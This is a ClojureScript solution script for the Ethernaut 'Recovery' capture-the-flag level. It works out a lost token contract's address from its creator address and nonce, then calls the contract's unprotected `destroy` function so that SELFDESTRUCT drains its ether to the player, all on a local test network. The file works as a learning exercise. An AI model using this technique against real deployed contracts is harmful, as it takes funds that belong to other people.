(ns ctf.ethernaut.recovery
  "Contract addresses are deterministic.
  You need the Creator's address and nonce to compute the
  deployed address

  Using Recovery contract we an find address of the SimpleToken.
  Then we can call `.destroy` to trigger `SELFDESTRUCT`. It will
  drain the contract.
  "
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-recovery!
  []
  (let [contract (u/contract :recovery/recovery
                             w/local-wallet)]
    (.deploy contract)))


(defn simple-token
  "Given the address of the creator and nonce
  determines the address of the SimpleToken Contract"
  [creator-addr]
  (u/get-contract!
   (.getContractAddress
    (.-utils u/ethers)
    (js-obj "from"
            creator-addr
            "nonce"
            ;; Nonce of Recovery Contract
            (u/big-num 1)))
   (u/abi (:recovery/simple-token u/contracts))
   w/local-wallet))


(defn recover
  []
  (try-async
   [recovery (<p! (deploy-recovery!))
    _        (<p!
              (.generateToken recovery
                              "simpleToken"
                              (u/eth-str->wei "10")))

    st (simple-token (.-address recovery))

    tx (js-obj "to"
               (.-address st)
               "value"
               (u/eth-str->wei "0.2")
               "gasLimit"
               80000)

    ;; fund simple-token, to check if we destroy it later
    _ (<p! (.sendTransaction w/local-wallet tx))
    st-balance-before (<p! (.getBalance w/local-provider (.-address st)))

    ;; trigger self destruct
    _ (<p!
       (.destroy st (.-address player)))


    st-balance-after  (<p! (.getBalance w/local-provider (.-address st)))]

   [st-balance-before, st-balance-after]))



(comment

  ;; Execute the code to trigger Recovery!
  (a/take! (recover) #(prn %))



  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (def recovery (atom ""))
  (-> (deploy-recovery!)
      (.then #(reset! recovery %))
      (.catch #(.log js/console %)))

  (-> (.generateToken @recovery
                      "simpleToken"
                      (u/eth-str->wei "10"))
      (.then #(.log js/console  %))
      (.catch #(.log js/console %)))


  (->
   (.sendTransaction
    w/local-wallet
    (js-obj "to"
            (.-address simple-token)
            "value"
            (u/eth-str->wei "0.2")
            "gasLimit"
            80000))
   (.then #(.log js/console %))
   (.catch #(.log js/console %)))

  (->
   (.destroy simple-token (.-address w/local-wallet))
   (.then #(.log js/console %))
   (.catch #(.log js/console %)))


  (-> (.getBalance w/local-provider (.-address simple-token))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.getBalance w/local-provider (.-address w/local-wallet))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  )
